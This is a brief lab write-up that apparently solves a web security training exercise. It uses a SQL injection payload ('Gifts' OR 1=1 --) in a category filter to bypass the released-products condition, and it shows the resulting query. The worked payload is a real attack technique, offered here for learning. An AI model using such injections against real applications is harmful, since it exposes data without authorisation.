## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234007067-ccccb2d9-6ecf-41cf-b603-6d380c5a180b.png)

## Solution : 

Query made - 

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

To view all the products (both released and not released) , we include **Gifts' OR 1=1 --** so that it the condition evaluates to TRUE & displayed all the gifts.

The query looks like 

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1`
```

> NOTE - URL encode before forwarding the request

![image](https://user-images.githubusercontent.com/67383098/234009414-cef19c0c-1bac-4670-9fea-a69292e4bae3.png)
